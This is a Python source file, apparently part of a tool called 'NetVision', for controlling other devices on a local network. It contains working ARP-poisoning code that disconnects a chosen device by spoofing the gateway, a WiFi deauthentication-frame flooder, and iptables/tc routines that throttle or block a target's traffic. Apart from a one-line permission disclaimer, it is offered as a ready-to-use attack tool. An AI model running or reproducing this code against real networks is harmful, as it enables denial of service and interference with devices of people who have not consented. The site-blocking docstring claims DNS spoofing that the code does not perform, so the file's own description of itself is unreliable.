"""
NetVision — Network Control Module
Deauth attacks (kick devices), bandwidth throttling, and site blocking.
⚠ Use only on networks you own/have permission to manage.
"""

import subprocess
import threading
import time
import os
import re
from datetime import datetime
from collections import defaultdict

try:
    from scapy.all import (
        RadioTap, Dot11, Dot11Deauth, sendp,
        ARP, Ether, IP, send, conf
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False


class NetworkController:
    """Controls network: kick devices, throttle bandwidth, block sites."""

    def __init__(self, interface, gateway_ip, local_ip):
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.local_ip = local_ip
        self._running = False
        self._throttle_threads = {}
        self._blocked_sites = defaultdict(set)  # device_ip -> set of blocked domains
        self._kicked_devices = set()
        self._lock = threading.Lock()
        self._action_log = []

    # ═══════════════════════════════════════════════════════════════════
    # DEAUTH / KICK
    # ═══════════════════════════════════════════════════════════════════

    def kick_device(self, target_ip, target_mac=None, gateway_mac=None, duration=30):
        """Kick a device off the network using ARP poisoning (no response)."""
        if not SCAPY_OK:
            return False

        self._log(f"KICK {target_ip} for {duration}s")

        def _kick_loop():
            end_time = time.time() + duration
            while time.time() < end_time and self._running:
                try:
                    # Send invalid ARP to target: gateway is at a fake MAC
                    fake_mac = "de:ad:be:ef:00:01"
                    pkt = Ether(dst=target_mac or "ff:ff:ff:ff:ff:ff") / ARP(
                        op=2,
                        pdst=target_ip,
                        hwdst=target_mac or "ff:ff:ff:ff:ff:ff",
                        psrc=self.gateway_ip,
                        hwsrc=fake_mac,
                    )
                    sendp(pkt, verbose=False, iface=self.interface, count=3)
                except Exception:
                    pass
                time.sleep(0.5)

            with self._lock:
                self._kicked_devices.discard(target_ip)

        with self._lock:
            self._kicked_devices.add(target_ip)

        self._running = True
        t = threading.Thread(target=_kick_loop, daemon=True)
        t.start()
        return True

    def unkick_device(self, target_ip, gateway_mac):
        """Restore a kicked device's connection."""
        if not SCAPY_OK:
            return False

        self._log(f"UNKICK {target_ip}")

        try:
            pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                op=2,
                pdst=target_ip,
                hwdst="ff:ff:ff:ff:ff:ff",
                psrc=self.gateway_ip,
                hwsrc=gateway_mac,
            )
            sendp(pkt, verbose=False, iface=self.interface, count=5)
        except Exception:
            pass

        with self._lock:
            self._kicked_devices.discard(target_ip)
        return True

    def deauth_wifi(self, target_mac, bssid, count=50, mon_interface=None):
        """Send WiFi deauth frames (requires monitor mode interface)."""
        iface = mon_interface or self.interface

        self._log(f"DEAUTH {target_mac} x{count}")

        try:
            pkt = RadioTap() / Dot11(
                type=0, subtype=12,
                addr1=target_mac,   # Target
                addr2=bssid,        # AP
                addr3=bssid,        # AP
            ) / Dot11Deauth(reason=7)

            sendp(pkt, iface=iface, count=count, inter=0.05, verbose=False)
            return True
        except Exception as e:
            self._log(f"DEAUTH failed: {e}")
            return False

    # ═══════════════════════════════════════════════════════════════════
    # BANDWIDTH THROTTLE
    # ═══════════════════════════════════════════════════════════════════

    def throttle_device(self, target_ip, rate_kbps=100):
        """Throttle a device's bandwidth using tc (traffic control)."""
        self._log(f"THROTTLE {target_ip} to {rate_kbps}kbps")

        try:
            iface = self.interface

            # Add iptables mark
            mark = hash(target_ip) % 65535 + 1

            # Mark packets from this IP
            subprocess.run([
                "iptables", "-t", "mangle", "-A", "FORWARD",
                "-s", target_ip, "-j", "MARK", "--set-mark", str(mark)
            ], capture_output=True, timeout=5)

            subprocess.run([
                "iptables", "-t", "mangle", "-A", "FORWARD",
                "-d", target_ip, "-j", "MARK", "--set-mark", str(mark)
            ], capture_output=True, timeout=5)

            # Setup tc qdisc
            subprocess.run([
                "tc", "qdisc", "add", "dev", iface,
                "root", "handle", "1:", "htb"
            ], capture_output=True, timeout=5)

            # Add class with rate limit
            subprocess.run([
                "tc", "class", "add", "dev", iface,
                "parent", "1:", "classid", f"1:{mark}",
                "htb", "rate", f"{rate_kbps}kbit",
                "ceil", f"{rate_kbps}kbit"
            ], capture_output=True, timeout=5)

            # Add filter
            subprocess.run([
                "tc", "filter", "add", "dev", iface,
                "parent", "1:", "protocol", "ip",
                "handle", str(mark), "fw",
                "flowid", f"1:{mark}"
            ], capture_output=True, timeout=5)

            return True
        except Exception as e:
            self._log(f"THROTTLE failed: {e}")
            return False

    def unthrottle_device(self, target_ip):
        """Remove bandwidth throttle for a device."""
        self._log(f"UNTHROTTLE {target_ip}")

        try:
            mark = hash(target_ip) % 65535 + 1

            # Remove iptables marks
            subprocess.run([
                "iptables", "-t", "mangle", "-D", "FORWARD",
                "-s", target_ip, "-j", "MARK", "--set-mark", str(mark)
            ], capture_output=True, timeout=5)

            subprocess.run([
                "iptables", "-t", "mangle", "-D", "FORWARD",
                "-d", target_ip, "-j", "MARK", "--set-mark", str(mark)
            ], capture_output=True, timeout=5)

            return True
        except Exception:
            return False

    # ═══════════════════════════════════════════════════════════════════
    # SITE BLOCKING
    # ═══════════════════════════════════════════════════════════════════

    def block_site(self, target_ip, domain):
        """Block a specific website for a device using iptables + DNS spoofing."""
        self._log(f"BLOCK {domain} for {target_ip}")

        try:
            # Use iptables to drop packets to the domain's IPs
            # First resolve domain
            import socket
            try:
                ips = socket.getaddrinfo(domain, None)
                resolved_ips = set(info[4][0] for info in ips)
            except socket.gaierror:
                resolved_ips = set()

            for ip in resolved_ips:
                subprocess.run([
                    "iptables", "-A", "FORWARD",
                    "-s", target_ip,
                    "-d", ip,
                    "-j", "DROP"
                ], capture_output=True, timeout=5)

            with self._lock:
                self._blocked_sites[target_ip].add(domain)

            return True
        except Exception as e:
            self._log(f"BLOCK failed: {e}")
            return False

    def unblock_site(self, target_ip, domain):
        """Unblock a website for a device."""
        self._log(f"UNBLOCK {domain} for {target_ip}")

        try:
            import socket
            try:
                ips = socket.getaddrinfo(domain, None)
                resolved_ips = set(info[4][0] for info in ips)
            except socket.gaierror:
                resolved_ips = set()

            for ip in resolved_ips:
                subprocess.run([
                    "iptables", "-D", "FORWARD",
                    "-s", target_ip,
                    "-d", ip,
                    "-j", "DROP"
                ], capture_output=True, timeout=5)

            with self._lock:
                self._blocked_sites[target_ip].discard(domain)

            return True
        except Exception:
            return False

    # ═══════════════════════════════════════════════════════════════════
    # CLEANUP
    # ═══════════════════════════════════════════════════════════════════

    def cleanup(self):
        """Remove all iptables rules and tc qdiscs we added."""
        self._running = False
        self._log("CLEANUP all rules")

        try:
            # Flush mangle table forward chain
            subprocess.run(["iptables", "-t", "mangle", "-F", "FORWARD"],
                          capture_output=True, timeout=5)
            # Remove tc qdisc
            subprocess.run(["tc", "qdisc", "del", "dev", self.interface, "root"],
                          capture_output=True, timeout=5)
        except Exception:
            pass

    def _log(self, action):
        self._action_log.append({
            "time": datetime.now().strftime("%H:%M:%S"),
            "action": action,
        })

    def get_status(self):
        with self._lock:
            return {
                "kicked": list(self._kicked_devices),
                "blocked_sites": {ip: list(sites) for ip, sites in self._blocked_sites.items()},
                "log": self._action_log[-20:],
            }
